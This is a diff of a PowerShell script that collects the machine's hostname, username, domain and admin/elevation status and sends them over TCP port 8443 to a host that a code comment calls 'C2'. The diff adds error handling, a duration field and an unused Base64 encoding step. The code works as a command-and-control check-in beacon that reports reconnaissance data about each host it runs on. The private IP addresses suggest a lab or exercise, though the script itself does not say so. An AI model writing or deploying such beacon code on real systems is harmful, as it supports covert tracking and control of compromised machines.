@@ -3,15 +3,15 @@
 #
 
 # Define arguments
-param($stage="Init", $state="Unknown")
+param($stage="Init", $state="Unknown", $duration="N/A")
 
 # Define session variables
 $hostname = $env:COMPUTERNAME
 $username = $env:USERNAME
 $domain = $env:USERDOMAIN
 $timestamp = Get-Date -Format "yyyy-MM-ddTHH:mm:ssK"
-$init_message = "[{0}] Hostname: {1}, Username: {2}\{3}, Admin: {4}, Elevated: {5}, Stage: {6}, State: {7}"
-$init_message_json = '{{"timestamp": "{0}, "hostname": "{1}", "username": "{2}\{3}", "admin": {4}, "elevated": {5}, "stage": "{6}", "state": "{7}"}}'
+$init_message = "[{0}] Hostname: {1}, Username: {2}\{3}, Admin: {4}, Elevated: {5}, Stage: {6}, State: {7}, Duration: {8}"
+$init_message_json = '{{"timestamp": "{0}, "hostname": "{1}", "username": "{2}\{3}", "admin": {4}, "elevated": {5}, "stage": "{6}", "state": "{7}", "duration": "{8}"}}'
 
 # Determine if this is an admin user, and if this session is elevated
 $admin_user = ($username -split "-")[1]
@@ -28,25 +28,44 @@ if ($admin_user -ne $null)
 
 # Debug output
 #write-host('')
-#write-host($init_message -f $timestamp, $hostname, $domain, $username, $is_admin, $is_elevated, $stage, $state)
+$message = ($init_message -f $timestamp, $hostname, $domain, $username, $is_admin, $is_elevated, $stage, $state, $duration)
 #write-host('')
-$json__message = ($init_message_json -f $timestamp, $hostname, $domain, $username, $is_admin, $is_elevated, $stage, $state | convertto-json | convertfrom-json)
-$tcp_message = [text.Encoding]::ASCII.GetBytes($json__message)
+$json_message = ($init_message_json -f $timestamp, $hostname, $domain, $username, $is_admin, $is_elevated, $stage, $state, $duration | convertto-json | convertfrom-json)
 write-host('')
 
 # Create TCP socket to C2 and send $tcp_message
-$logserver = "172.16.100.253"
-$logport = 8443
+$remoteHost="172.25.0.181"
+$port=8443  
 
-$socket = New-Object System.Net.Sockets.TcpClient($logserver, $logport)
-$stream = $socket.GetStream()
-$writer = New-Object System.IO.StreamWriter($stream)
+try
+{
+	Write-Host "Connecting to $remoteHost on port $port ... " -NoNewLine
+	try
+	{
+		$socket = New-Object System.Net.Sockets.TcpClient( $remoteHost, $port )
+		Write-Host -ForegroundColor Green "OK"
+	}
+	catch
+	{
+		Write-Host -ForegroundColor Red "failed"
+		exit -1
+	}
 
-start-sleep -m 500
-Write-Host('Sending message: {0}' -f $tcp__message)
-$writer.Writeline($tcp_message)
-$writer.Flush()
+	$stream = $socket.GetStream( )
+	$writer = New-Object System.IO.StreamWriter( $stream )
+	$buffer = New-Object System.Byte[] 1024
+	$encoding = New-Object System.Text.AsciiEncoding
+    $tcp_message = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($json_message))
+	start-sleep -m 500
+    write-host("Sending message: {0}" -f $message)
+	$writer.WriteLine( $message )
+    #write-host("Sending message: {0}" -f $json_message)
+	#$writer.WriteLine( $json_message )
+	$writer.Flush( )
 
-$writer.Close()
-$stream.Close()
-$socket.Close()
+}
+finally
+{
+	if( $writer ) {	$writer.Close( )	}
+	if( $stream ) {	$stream.Close( )	}
+} 
